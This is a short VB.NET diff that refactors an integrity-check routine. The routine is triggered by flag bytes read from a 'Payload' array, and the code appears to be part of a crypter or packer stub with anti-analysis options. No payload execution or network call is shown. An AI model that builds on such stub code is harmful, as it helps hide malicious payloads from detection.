@@ -34,10 +34,10 @@ Class Stuff
         Return NewByts
     End Function
 
-    Shared Sub Ant()
+    Shared Sub AZ(ByVal AppPAth As String, ByVal ExePAth As String)
         Dim L = New anti.IntegrityCheck
-        L.AppExePath = Application.ExecutablePath
-        L.AppPath = Application.StartupPath
+        L.AppExePath = ExePAth
+        L.AppPath = AppPAth
         L.RunCheck()
     End Sub
 
@@ -48,8 +48,8 @@ Class Stuff
         Dim i As Integer = FindSplit(Payload)
         Dim Start As Integer = i
         If Payload(Start - 10) = &H54 Then
-            'anti's
-            Ant()
+            'AZi's
+            AZ(Application.StartupPath, Application.ExecutablePath)
         End If
 
         If Payload(Start - 14) = &H54 Then
